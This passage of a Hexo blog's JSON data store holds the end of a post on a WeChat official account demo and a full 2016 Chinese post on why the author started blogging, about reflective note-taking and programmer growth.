</li>\n<li>&#x652F;&#x6301;&#x5404;&#x6D88;&#x606F;&#x7C7B;&#x578B;&#x7684;&#x8BC6;&#x522B;&#x3002;&#x76EE;&#x524D;&#x53EF;&#x4EE5;&#x8BC6;&#x522B;&#x7528;&#x6237;&#x53D1;&#x9001;&#x7684;&#x6587;&#x672C;&#x3001;&#x56FE;&#x7247;&#x3001;&#x58F0;&#x97F3;&#x3001;&#x5730;&#x5740;&#x548C;&#x94FE;&#x63A5;&#x4FE1;&#x606F;&#x7B49;&#x3002;</li>\n<li>&#x652F;&#x6301;&#x62CD;&#x7167;&#x7B54;&#x9898;&#x3002;&#x5FAE;&#x4FE1;&#x516C;&#x4F17;&#x53F7;&#x5185;&#x5E26;&#x62CD;&#x7167;&#x529F;&#x80FD;&#xFF0C;&#x7528;&#x6237;&#x53D1;&#x9001;&#x56FE;&#x7247;&#x540E;&#xFF0C;&#x540E;&#x7AEF;&#x53EF;&#x8C03;&#x7528;&#x63A5;&#x53E3;&#x8FDB;&#x884C;&#x56FE;&#x7247;&#x8BC6;&#x522B;&#xFF0C;&#x5E76;&#x56DE;&#x590D;&#x56FE;&#x6587;&#x4FE1;&#x606F;&#x3002; </li>\n<li>&#x901A;&#x8FC7;&#x70B9;&#x51FB;&#x83DC;&#x5355;&#xFF0C;&#x76EE;&#x524D;&#x53EF;&#x4EE5;&#x8FDB;&#x5165;&#x81EA;&#x5B9A;&#x4E49;&#x9875;&#x9762;&#x3002;&#x540E;&#x671F;&#x524D;&#x7AEF;&#x53EF;&#x4EE5;&#x4ECB;&#x5165;&#x8FDB;&#x884C;&#x76F8;&#x5173;HTML5&#x5F00;&#x53D1;&#x3002; </li>\n<li>&#x652F;&#x6301;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x7684;&#x83B7;&#x53D6;&#x3002;&#x540E;&#x671F;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x4E2A;&#x6027;&#x5316;&#x4E1A;&#x52A1;&#x5904;&#x7406;&#x3002;</li>\n<li>&#x652F;&#x6301;&#x7528;&#x6237;&#x5206;&#x7EC4;&#x67E5;&#x8BE2;&#x3001;&#x7528;&#x6237;&#x5206;&#x7EC4;&#x521B;&#x5EFA;&#x3001;&#x7528;&#x6237;&#x5206;&#x7EC4;&#x4FEE;&#x6539;&#x7B49;&#x3002;</li>\n<li>&#x652F;&#x6301;&#x4E34;&#x65F6;/&#x6C38;&#x4E45;&#x5E26;&#x53C2;&#x4E8C;&#x7EF4;&#x7801;&#x7684;&#x521B;&#x5EFA;&#x3002;</li>\n<li>&#x652F;&#x6301;&#x5A92;&#x4F53;&#x6587;&#x4EF6;&#x7684;&#x4E0A;&#x4F20;&#x4E0E;&#x4E0B;&#x8F7D;&#x3002;</li>\n</ul>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/1.png\" alt=\"\"><br></p>","more":"<p></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/2.png\" alt=\"\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/3.png\" alt=\"\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/4.png\" alt=\"\"></p>\n<hr>\n<p>&#x9879;&#x76EE;&#x5B9E;&#x73B0;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x4F7F;&#x7528;&#x7684;&#x662F;servlet&#xFF0C;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x5176;&#x4ED6;&#x67B6;&#x6784;&#x548C;&#x591A;&#x4F59;&#x4EE3;&#x7801;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x67E5;&#x770B;&#x6838;&#x5FC3;&#x4E1A;&#x52A1;&#x7C7B;CoreService&#x3002;<br>Github&#x5730;&#x5740;&#xFF1A;<a href=\"https://github.com/Wasim37/weixin_demo.git\">https://github.com/Wasim37/weixin_demo.git</a> (&#x6301;&#x7EED;&#x66F4;&#x65B0;&#x4E2D;)</p>"},{"title":"开博这件事","date":"2016-04-27T13:18:00.000Z","toc":false,"_content":"\n本人有点懒，不太喜欢用脑子刻意去记一些东西。\n但是东西多了易忘，怕忘，所以工作中逐渐养成了记录的习惯。\n我用的是有道云，那里按类别记录了我最近几年的工作所得。\n可是随着内容增多，慢慢发现了一个问题：有些知识记下了，仍然不是你的。\n\n我知道记录能给我带来巨大好处，白底黑字会不断的通过视觉刺激来提醒我它的存在\n让我不必花大力气去刻意记忆曾经所学所想，而只需腾出精力对所记内容进行补充完善。\n\n可惜行动总跟不上思维的节奏，稍有懈怠，记录便纯粹为了记录而记录。\n在微信公众号上看到一篇技术文章，有时觉得挺好，随手就记录到了有道云。\n可大多时候，这个过程没有思考，没有总结，好像就只是看了一个故事。\n\n孔子有云: 学而不思则罔，思而不学则殆。\n当你记录的某个知识点，后期不断查看却还总是模棱两可的时候，就要反思了。\n\n然后我就想到了开博这件事，开博意味着公开，公开意味着分享。\n分享会让我不可避免的去思考和总结，去写出让人眼前一亮的东西。\n\n最近在云栖社区看了一篇文章，里面谈到程序员怎么提升自身价值，程序员的影响力一般体现在:\n\n```bash\n对内：\n在小组内部你技术最牛，小伙伴们有各种疑难杂症解决不了的时候都会想到你。\n产品对你非常有信心，给你的需求你都能高度。\n你经常主动给小伙伴们分享新技术、新东西，小伙伴知道的你都知到，小伙伴不知道的你也知道。\n\n对外：\n你参与过知名产品的架构开发，对外参加分享会。\n你是某个牛逼开源组件的作者。\n你写过某方面技术类书。\n你的博客比较有名，有很多粉丝。\n```\n\n看起来很难，但是知道目标了，怎么做就明确很多了。\n文章的建议大致是，挑战各种疑难杂症，经常总结；多回头整理项目代码，沉淀公用组建；多读书，提高视野；经常写博客，总结梳理知识；多画思维导图、技术图谱，把知识都串起来；\n\n\n所以我希望开博对我是一个好的开端。教是最好的学，积极分享，大家共勉。\n\n","source":"_posts/我为什么开博.md","raw":"---\ntitle: 开博这件事\ncategories:\n  - 相关感悟\ndate: 2016-4-27 21:18:00\ntoc: false\n---\n\n本人有点懒，不太喜欢用脑子刻意去记一些东西。\n但是东西多了易忘，怕忘，所以工作中逐渐养成了记录的习惯。\n我用的是有道云，那里按类别记录了我最近几年的工作所得。\n可是随着内容增多，慢慢发现了一个问题：有些知识记下了，仍然不是你的。\n\n我知道记录能给我带来巨大好处，白底黑字会不断的通过视觉刺激来提醒我它的存在\n让我不必花大力气去刻意记忆曾经所学所想，而只需腾出精力对所记内容进行补充完善。\n\n可惜行动总跟不上思维的节奏，稍有懈怠，记录便纯粹为了记录而记录。\n在微信公众号上看到一篇技术文章，有时觉得挺好，随手就记录到了有道云。\n可大多时候，这个过程没有思考，没有总结，好像就只是看了一个故事。\n\n孔子有云: 学而不思则罔，思而不学则殆。\n当你记录的某个知识点，后期不断查看却还总是模棱两可的时候，就要反思了。\n\n然后我就想到了开博这件事，开博意味着公开，公开意味着分享。\n分享会让我不可避免的去思考和总结，去写出让人眼前一亮的东西。\n\n最近在云栖社区看了一篇文章，里面谈到程序员怎么提升自身价值，程序员的影响力一般体现在:\n\n```bash\n对内：\n在小组内部你技术最牛，小伙伴们有各种疑难杂症解决不了的时候都会想到你。\n产品对你非常有信心，给你的需求你都能高度。\n你经常主动给小伙伴们分享新技术、新东西，小伙伴知道的你都知到，小伙伴不知道的你也知道。\n\n对外：\n你参与过知名产品的架构开发，对外参加分享会。\n你是某个牛逼开源组件的作者。\n你写过某方面技术类书。\n你的博客比较有名，有很多粉丝。\n```\n\n看起来很难，但是知道目标了，怎么做就明确很多了。\n文章的建议大致是，挑战各种疑难杂症，经常总结；多回头整理项目代码，沉淀公用组建；多读书，提高视野；经常写博客，总结梳理知识；多画思维导图、技术图谱，把知识都串起来；\n\n\n所以我希望开博对我是一个好的开端。教是最好的学，积极分享，大家共勉。\n\n","slug":"我为什么开博","published":1,"updated":"2016-11-17T11:59:42.681Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulen004tgwtmj3w77m9m","content":"<p>&#x672C;&#x4EBA;&#x6709;&#x70B9;&#x61D2;&#xFF0C;&#x4E0D;&#x592A;&#x559C;&#x6B22;&#x7528;&#x8111;&#x5B50;&#x523B;&#x610F;&#x53BB;&#x8BB0;&#x4E00;&#x4E9B;&#x4E1C;&#x897F;&#x3002;<br>&#x4F46;&#x662F;&#x4E1C;&#x897F;&#x591A;&#x4E86;&#x6613;&#x5FD8;&#xFF0C;&#x6015;&#x5FD8;&#xFF0C;&#x6240;&#x4EE5;&#x5DE5;&#x4F5C;&#x4E2D;&#x9010;&#x6E10;&#x517B;&#x6210;&#x4E86;&#x8BB0;&#x5F55;&#x7684;&#x4E60;&#x60EF;&#x3002;<br>&#x6211;&#x7528;&#x7684;&#x662F;&#x6709;&#x9053;&#x4E91;&#xFF0C;&#x90A3;&#x91CC;&#x6309;&#x7C7B;&#x522B;&#x8BB0;&#x5F55;&#x4E86;&#x6211;&#x6700;&#x8FD1;&#x51E0;&#x5E74;&#x7684;&#x5DE5;&#x4F5C;&#x6240;&#x5F97;&#x3002;<br>&#x53EF;&#x662F;&#x968F;&#x7740;&#x5185;&#x5BB9;&#x589E;&#x591A;&#xFF0C;&#x6162;&#x6162;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;&#x6709;&#x4E9B;&#x77E5;&#x8BC6;&#x8BB0;&#x4E0B;&#x4E86;&#xFF0C;&#x4ECD;&#x7136;&#x4E0D;&#x662F;&#x4F60;&#x7684;&#x3002;</p>\n<p>&#x6211;&#x77E5;&#x9053;&#x8BB0;&#x5F55;&#x80FD;&#x7ED9;&#x6211;&#x5E26;&#x6765;&#x5DE8;&#x5927;&#x597D;&#x5904;&#xFF0C;&#x767D;&#x5E95;&#x9ED1;&#x5B57;&#x4F1A;&#x4E0D;&#x65AD;&#x7684;&#x901A;&#x8FC7;&#x89C6;&#x89C9;&#x523A;&#x6FC0;&#x6765;&#x63D0;&#x9192;&#x6211;&#x5B83;&#x7684;&#x5B58;&#x5728;<br>&#x8BA9;&#x6211;&#x4E0D;&#x5FC5;&#x82B1;&#x5927;&#x529B;&#x6C14;&#x53BB;&#x523B;&#x610F;&#x8BB0;&#x5FC6;&#x66FE;&#x7ECF;&#x6240;&#x5B66;&#x6240;&#x60F3;&#xFF0C;&#x800C;&#x53EA;&#x9700;&#x817E;&#x51FA;&#x7CBE;&#x529B;&#x5BF9;&#x6240;&#x8BB0;&#x5185;&#x5BB9;&#x8FDB;&#x884C;&#x8865;&#x5145;&#x5B8C;&#x5584;&#x3002;</p>\n<p>&#x53EF;&#x60DC;&#x884C;&#x52A8;&#x603B;&#x8DDF;&#x4E0D;&#x4E0A;&#x601D;&#x7EF4;&#x7684;&#x8282;&#x594F;&#xFF0C;&#x7A0D;&#x6709;&#x61C8;&#x6020;&#xFF0C;&#x8BB0;&#x5F55;&#x4FBF;&#x7EAF;&#x7CB9;&#x4E3A;&#x4E86;&#x8BB0;&#x5F55;&#x800C;&#x8BB0;&#x5F55;&#x3002;<br>&#x5728;&#x5FAE;&#x4FE1;&#x516C;&#x4F17;&#x53F7;&#x4E0A;&#x770B;&#x5230;&#x4E00;&#x7BC7;&#x6280;&#x672F;&#x6587;&#x7AE0;&#xFF0C;&#x6709;&#x65F6;&#x89C9;&#x5F97;&#x633A;&#x597D;&#xFF0C;&#x968F;&#x624B;&#x5C31;&#x8BB0;&#x5F55;&#x5230;&#x4E86;&#x6709;&#x9053;&#x4E91;&#x3002;<br>&#x53EF;&#x5927;&#x591A;&#x65F6;&#x5019;&#xFF0C;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x6CA1;&#x6709;&#x601D;&#x8003;&#xFF0C;&#x6CA1;&#x6709;&#x603B;&#x7ED3;&#xFF0C;&#x597D;&#x50CF;&#x5C31;&#x53EA;&#x662F;&#x770B;&#x4E86;&#x4E00;&#x4E2A;&#x6545;&#x4E8B;&#x3002;</p>\n<p>&#x5B54;&#x5B50;&#x6709;&#x4E91;: &#x5B66;&#x800C;&#x4E0D;&#x601D;&#x5219;&#x7F54;&#xFF0C;&#x601D;&#x800C;&#x4E0D;&#x5B66;&#x5219;&#x6B86;&#x3002;<br>&#x5F53;&#x4F60;&#x8BB0;&#x5F55;&#x7684;&#x67D0;&#x4E2A;&#x77E5;&#x8BC6;&#x70B9;&#xFF0C;&#x540E;&#x671F;&#x4E0D;&#x65AD;&#x67E5;&#x770B;&#x5374;&#x8FD8;&#x603B;&#x662F;&#x6A21;&#x68F1;&#x4E24;&#x53EF;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x8981;&#x53CD;&#x601D;&#x4E86;&#x3002;</p>\n<p>&#x7136;&#x540E;&#x6211;&#x5C31;&#x60F3;&#x5230;&#x4E86;&#x5F00;&#x535A;&#x8FD9;&#x4EF6;&#x4E8B;&#xFF0C;&#x5F00;&#x535A;&#x610F;&#x5473;&#x7740;&#x516C;&#x5F00;&#xFF0C;&#x516C;&#x5F00;&#x610F;&#x5473;&#x7740;&#x5206;&#x4EAB;&#x3002;<br>&#x5206;&#x4EAB;&#x4F1A;&#x8BA9;&#x6211;&#x4E0D;&#x53EF;&#x907F;&#x514D;&#x7684;&#x53BB;&#x601D;&#x8003;&#x548C;&#x603B;&#x7ED3;&#xFF0C;&#x53BB;&#x5199;&#x51FA;&#x8BA9;&#x4EBA;&#x773C;&#x524D;&#x4E00;&#x4EAE;&#x7684;&#x4E1C;&#x897F;&#x3002;</p>\n<p>&#x6700;&#x8FD1;&#x5728;&#x4E91;&#x6816;&#x793E;&#x533A;&#x770B;&#x4E86;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#xFF0C;&#x91CC;&#x9762;&#x8C08;&#x5230;&#x7A0B;&#x5E8F;&#x5458;&#x600E;&#x4E48;&#x63D0;&#x5347;&#x81EA;&#x8EAB;&#x4EF7;&#x503C;&#xFF0C;&#x7A0B;&#x5E8F;&#x5458;&#x7684;&#x5F71;&#x54CD;&#x529B;&#x4E00;&#x822C;&#x4F53;&#x73B0;&#x5728;:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x5BF9;&#x5185;&#xFF1A;</span><br><span class=\"line\">&#x5728;&#x5C0F;&#x7EC4;&#x5185;&#x90E8;&#x4F60;&#x6280;&#x672F;&#x6700;&#x725B;&#xFF0C;&#x5C0F;&#x4F19;&#x4F34;&#x4EEC;&#x6709;&#x5404;&#x79CD;&#x7591;&#x96BE;&#x6742;&#x75C7;&#x89E3;&#x51B3;&#x4E0D;&#x4E86;&#x7684;&#x65F6;&#x5019;&#x90FD;&#x4F1A;&#x60F3;&#x5230;&#x4F60;&#x3002;</span><br><span class=\"line\">&#x4EA7;&#x54C1;&#x5BF9;&#x4F60;&#x975E;&#x5E38;&#x6709;&#x4FE1;&#x5FC3;&#xFF0C;&#x7ED9;&#x4F60;&#x7684;&#x9700;&#x6C42;&#x4F60;&#x90FD;&#x80FD;&#x9AD8;&#x5EA6;&#x3002;</span><br><span class=\"line\">&#x4F60;&#x7ECF;&#x5E38;&#x4E3B;&#x52A8;&#x7ED9;&#x5C0F;&#x4F19;&#x4F34;&#x4EEC;&#x5206;&#x4EAB;&#x65B0;&#x6280;&#x672F;&#x3001;&#x65B0;&#x4E1C;&#x897F;&#xFF0C;&#x5C0F;&#x4F19;&#x4F34;&#x77E5;&#x9053;&#x7684;&#x4F60;&#x90FD;&#x77E5;&#x5230;&#xFF0C;&#x5C0F;&#x4F19;&#x4F34;&#x4E0D;&#x77E5;&#x9053;&#x7684;&#x4F60;&#x4E5F;&#x77E5;&#x9053;&#x3002;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x5BF9;&#x5916;&#xFF1A;</span><br><span class=\"line\">&#x4F60;&#x53C2;&#x4E0E;&#x8FC7;&#x77E5;&#x540D;&#x4EA7;&#x54C1;&#x7684;&#x67B6;&#x6784;&#x5F00;&#x53D1;&#xFF0C;&#x5BF9;&#x5916;&#x53C2;&#x52A0;&#x5206;&#x4EAB;&#x4F1A;&#x3002;</span><br><span class=\"line\">&#x4F60;&#x662F;&#x67D0;&#x4E2A;&#x725B;&#x903C;&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x7684;&#x4F5C;&#x8005;&#x3002;</span><br><span class=\"line\">&#x4F60;&#x5199;&#x8FC7;&#x67D0;&#x65B9;&#x9762;&#x6280;&#x672F;&#x7C7B;&#x4E66;&#x3002;</span><br><span class=\"line\">&#x4F60;&#x7684;&#x535A;&#x5BA2;&#x6BD4;&#x8F83;&#x6709;&#x540D;&#xFF0C;&#x6709;&#x5F88;&#x591A;&#x7C89;&#x4E1D;&#x3002;</span><br></pre></td></tr></table></figure>\n<p>&#x770B;&#x8D77;&#x6765;&#x5F88;&#x96BE;&#xFF0C;&#x4F46;&#x662F;&#x77E5;&#x9053;&#x76EE;&#x6807;&#x4E86;&#xFF0C;&#x600E;&#x4E48;&#x505A;&#x5C31;&#x660E;&#x786E;&#x5F88;&#x591A;&#x4E86;&#x3002;<br>&#x6587;&#x7AE0;&#x7684;&#x5EFA;&#x8BAE;&#x5927;&#x81F4;&#x662F;&#xFF0C;&#x6311;&#x6218;&#x5404;&#x79CD;&#x7591;&#x96BE;&#x6742;&#x75C7;&#xFF0C;&#x7ECF;&#x5E38;&#x603B;&#x7ED3;&#xFF1B;&#x591A;&#x56DE;&#x5934;&#x6574;&#x7406;&#x9879;&#x76EE;&#x4EE3;&#x7801;&#xFF0C;&#x6C89;&#x6DC0;&#x516C;&#x7528;&#x7EC4;&#x5EFA;&#xFF1B;&#x591A;&#x8BFB;&#x4E66;&#xFF0C;&#x63D0;&#x9AD8;&#x89C6;&#x91CE;&#xFF1B;&#x7ECF;&#x5E38;&#x5199;&#x535A;&#x5BA2;&#xFF0C;&#x603B;&#x7ED3;&#x68B3;&#x7406;&#x77E5;&#x8BC6;&#xFF1B;&#x591A;&#x753B;&#x601D;&#x7EF4;&#x5BFC;&#x56FE;&#x3001;&#x6280;&#x672F;&#x56FE;&#x8C31;&#xFF0C;&#x628A;&#x77E5;&#x8BC6;&#x90FD;&#x4E32;&#x8D77;&#x6765;&#xFF1B;</p>\n<p>&#x6240;&#x4EE5;&#x6211;&#x5E0C;&#x671B;&#x5F00;&#x535A;&#x5BF9;&#x6211;&#x662F;&#x4E00;&#x4E2A;&#x597D;&#x7684;&#x5F00;&#x7AEF;&#x3002;&#x6559;&#x662F;&#x6700;&#x597D;&#x7684;&#x5B66;&#xFF0C;&#x79EF;&#x6781;&#x5206;&#x4EAB;&#xFF0C;&#x5927;&#x5BB6;&#x5171;&#x52C9;&#x3002;</p>\n","excerpt":"","more":"<p>&#x672C;&#x4EBA;&#x6709;&#x70B9;&#x61D2;&#xFF0C;&#x4E0D;&#x592A;&#x559C;&#x6B22;&#x7528;&#x8111;&#x5B50;&#x523B;&#x610F;&#x53BB;&#x8BB0;&#x4E00;&#x4E9B;&#x4E1C;&#x897F;&#x3002;<br>&#x4F46;&#x662F;&#x4E1C;&#x897F;&#x591A;&#x4E86;&#x6613;&#x5FD8;&#xFF0C;&#x6015;&#x5FD8;&#xFF0C;&#x6240;&#x4EE5;&#x5DE5;&#x4F5C;&#x4E2D;&#x9010;&#x6E10;&#x517B;&#x6210;&#x4E86;&#x8BB0;&#x5F55;&#x7684;&#x4E60;&#x60EF;&#x3002;<br>&#x6211;&#x7528;&#x7684;&#x662F;&#x6709;&#x9053;&#x4E91;&#xFF0C;&#x90A3;&#x91CC;&#x6309;&#x7C7B;&#x522B;&#x8BB0;&#x5F55;&#x4E86;&#x6211;&#x6700;&#x8FD1;&#x51E0;&#x5E74;&#x7684;&#x5DE5;&#x4F5C;&#x6240;&#x5F97;&#x3002;<br>&#x53EF;&#x662F;&#x968F;&#x7740;&#x5185;&#x5BB9;&#x589E;&#x591A;&#xFF0C;&#x6162;&#x6162;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;&#x6709;&#x4E9B;&#x77E5;&#x8BC6;&#x8BB0;&#x4E0B;&#x4E86;&#xFF0C;&#x4ECD;&#x7136;&#x4E0D;&#x662F;&#x4F60;&#x7684;&#x3002;</p>\n<p>&#x6211;&#x77E5;&#x9053;&#x8BB0;&#x5F55;&#x80FD;&#x7ED9;&#x6211;&#x5E26;&#x6765;&#x5DE8;&#x5927;&#x597D;&#x5904;&#xFF0C;&#x767D;&#x5E95;&#x9ED1;&#x5B57;&#x4F1A;&#x4E0D;&#x65AD;&#x7684;&#x901A;&#x8FC7;&#x89C6;&#x89C9;&#x523A;&#x6FC0;&#x6765;&#x63D0;&#x9192;&#x6211;&#x5B83;&#x7684;&#x5B58;&#x5728;<br>&#x8BA9;&#x6211;&#x4E0D;&#x5FC5;&#x82B1;&#x5927;&#x529B;&#x6C14;&#x53BB;&#x523B;&#x610F;&#x8BB0;&#x5FC6;&#x66FE;&#x7ECF;&#x6240;&#x5B66;&#x6240;&#x60F3;&#xFF0C;&#x800C;&#x53EA;&#x9700;&#x817E;&#x51FA;&#x7CBE;&#x529B;&#x5BF9;&#x6240;&#x8BB0;&#x5185;&#x5BB9;&#x8FDB;&#x884C;&#x8865;&#x5145;&#x5B8C;&#x5584;&#x3002;</p>\n<p>&#x53EF;&#x60DC;&#x884C;&#x52A8;&#x603B;&#x8DDF;&#x4E0D;&#x4E0A;&#x601D;&#x7EF4;&#x7684;&#x8282;&#x594F;&#xFF0C;&#x7A0D;&#x6709;&#x61C8;&#x6020;&#xFF0C;&#x8BB0;&#x5F55;&#x4FBF;&#x7EAF;&#x7CB9;&#x4E3A;&#x4E86;&#x8BB0;&#x5F55;&#x800C;&#x8BB0;&#x5F55;&#x3002;<br>&#x5728;&#x5FAE;&#x4FE1;&#x516C;&#x4F17;&#x53F7;&#x4E0A;&#x770B;&#x5230;&#x4E00;&#x7BC7;&#x6280;&#x672F;&#x6587;&#x7AE0;&#xFF0C;&#x6709;&#x65F6;&#x89C9;&#x5F97;&#x633A;&#x597D;&#xFF0C;&#x968F;&#x624B;&#x5C31;&#x8BB0;&#x5F55;&#x5230;&#x4E86;&#x6709;&#x9053;&#x4E91;&#x3002;<br>&#x53EF;&#x5927;&#x591A;&#x65F6;&#x5019;&#xFF0C;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x6CA1;&#x6709;&#x601D;&#x8003;&#xFF0C;&#x6CA1;&#x6709;&#x603B;&#x7ED3;&#xFF0C;&#x597D;&#x50CF;&#x5C31;&#x53EA;&#x662F;&#x770B;&#x4E86;&#x4E00;&#x4E2A;&#x6545;&#x4E8B;&#x3002;</p>\n<p>&#x5B54;&#x5B50;&#x6709;&#x4E91;: &#x5B66;&#x800C;&#x4E0D;&#x601D;&#x5219;&#x7F54;&#xFF0C;&#x601D;&#x800C;&#x4E0D;&#x5B66;&#x5219;&#x6B86;&#x3002;<br>&#x5F53;&#x4F60;&#x8BB0;&#x5F55;&#x7684;&#x67D0;&#x4E2A;&#x77E5;&#x8BC6;&#x70B9;&#xFF0C;&#x540E;&#x671F;&#x4E0D;&#x65AD;&#x67E5;&#x770B;&#x5374;&#x8FD8;&#x603B;&#x662F;&#x6A21;&#x68F1;&#x4E24;&#x53EF;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x8981;&#x53CD;&#x601D;&#x4E86;&#x3002;</p>\n<p>&#x7136;&#x540E;&#x6211;&#x5C31;&#x60F3;&#x5230;&#x4E86;&#x5F00;&#x535A;&#x8FD9;&#x4EF6;&#x4E8B;&#xFF0C;&#x5F00;&#x535A;&#x610F;&#x5473;&#x7740;&#x516C;&#x5F00;&#xFF0C;&#x516C;&#x5F00;&#x610F;&#x5473;&#x7740;&#x5206;&#x4EAB;&#x3002;<br>&#x5206;&#x4EAB;&#x4F1A;&#x8BA9;&#x6211;&#x4E0D;&#x53EF;&#x907F;&#x514D;&#x7684;&#x53BB;&#x601D;&#x8003;&#x548C;&#x603B;&#x7ED3;&#xFF0C;&#x53BB;&#x5199;&#x51FA;&#x8BA9;&#x4EBA;&#x773C;&#x524D;&#x4E00;&#x4EAE;&#x7684;&#x4E1C;&#x897F;&#x3002;</p>\n<p>&#x6700;&#x8FD1;&#x5728;&#x4E91;&#x6816;&#x793E;&#x533A;&#x770B;&#x4E86;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#xFF0C;&#x91CC;&#x9762;&#x8C08;&#x5230;&#x7A0B;&#x5E8F;&#x5458;&#x600E;&#x4E48;&#x63D0;&#x5347;&#x81EA;&#x8EAB;&#x4EF7;&#x503C;&#xFF0C;&#x7A0B;&#x5E8F;&#x5458;&#x7684;&#x5F71;&#x54CD;&#x529B;&#x4E00;&#x822C;&#x4F53;&#x73B0;&#x5728;:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x5BF9;&#x5185;&#xFF1A;</span><br><span class=\"line\">&#x5728;&#x5C0F;&#x7EC4;&#x5185;&#x90E8;&#x4F60;&#x6280;&#x672F;&#x6700;&#x725B;&#xFF0C;&#x5C0F;&#x4F19;&#x4F34;&#x4EEC;&#x6709;&#x5404;&#x79CD;&#x7591;&#x96BE;&#x6742;&#x75C7;&#x89E3;&#x51B3;&#x4E0D;&#x4E86;&#x7684;&#x65F6;&#x5019;&#x90FD;&#x4F1A;&#x60F3;&#x5230;&#x4F60;&#x3002;</span><br><span class=\"line\">&#x4EA7;&#x54C1;&#x5BF9;&#x4F60;&#x975E;&#x5E38;&#x6709;&#x4FE1;&#x5FC3;&#xFF0C;&#x7ED9;&#x4F60;&#x7684;&#x9700;&#x6C42;&#x4F60;&#x90FD;&#x80FD;&#x9AD8;&#x5EA6;&#x3002;</span><br><span class=\"line\">&#x4F60;&#x7ECF;&#x5E38;&#x4E3B;&#x52A8;&#x7ED9;&#x5C0F;&#x4F19;&#x4F34;&#x4EEC;&#x5206;&#x4EAB;&#x65B0;&#x6280;&#x672F;&#x3001;&#x65B0;&#x4E1C;&#x897F;&#xFF0C;&#x5C0F;&#x4F19;&#x4F34;&#x77E5;&#x9053;&#x7684;&#x4F60;&#x90FD;&#x77E5;&#x5230;&#xFF0C;&#x5C0F;&#x4F19;&#x4F34;&#x4E0D;&#x77E5;&#x9053;&#x7684;&#x4F60;&#x4E5F;&#x77E5;&#x9053;&#x3002;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x5BF9;&#x5916;&#xFF1A;</span><br><span class=\"line\">&#x4F60;&#x53C2;&#x4E0E;&#x8FC7;&#x77E5;&#x540D;&#x4EA7;&#x54C1;&#x7684;&#x67B6;&#x6784;&#x5F00;&#x53D1;&#xFF0C;&#x5BF9;&#x5916;&#x53C2;&#x52A0;&#x5206;&#x4EAB;&#x4F1A;&#x3002;</span><br><span class=\"line\">&#x4F60;&#x662F;&#x67D0;&#x4E2A;&#x725B;&#x903C;&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x7684;&#x4F5C;&#x8005;&#x3002;</span><br><span class=\"line\">&#x4F60;&#x5199;&#x8FC7;&#x67D0;&#x65B9;&#x9762;&#x6280;&#x672F;&#x7C7B;&#x4E66;&#x3002;</span><br><span class=\"line\">&#x4F60;&#x7684;&#x535A;&#x5BA2;&#x6BD4;&#x8F83;&#x6709;&#x540D;&#xFF0C;&#x6709;&#x5F88;&#x591A;&#x7C89;&#x4E1D;&#x3002;</span><br></pre></td></tr></table></figure>\n<p>&#x770B;&#x8D77;&#x6765;&#x5F88;&#x96BE;&#xFF0C;&#x4F46;&#x662F;&#x77E5;&#x9053;&#x76EE;&#x6807;&#x4E86;&#xFF0C;&#x600E;&#x4E48;&#x505A;&#x5C31;&#x660E;&#x786E;&#x5F88;&#x591A;&#x4E86;&#x3002;<br>&#x6587;&#x7AE0;&#x7684;&#x5EFA;&#x8BAE;&#x5927;&#x81F4;&#x662F;&#xFF0C;&#x6311;&#x6218;&#x5404;&#x79CD;&#x7591;&#x96BE;&#x6742;&#x75C7;&#xFF0C;&#x7ECF;&#x5E38;&#x603B;&#x7ED3;&#xFF1B;&#x591A;&#x56DE;&#x5934;&#x6574;&#x7406;&#x9879;&#x76EE;&#x4EE3;&#x7801;&#xFF0C;&#x6C89;&#x6DC0;&#x516C;&#x7528;&#x7EC4;&#x5EFA;&#xFF1B;&#x591A;&#x8BFB;&#x4E66;&#xFF0C;&#x63D0;&#x9AD8;&#x89C6;&#x91CE;&#xFF1B;&#x7ECF;&#x5E38;&#x5199;&#x535A;&#x5BA2;&#xFF0C;&#x603B;&#x7ED3;&#x68B3;&#x74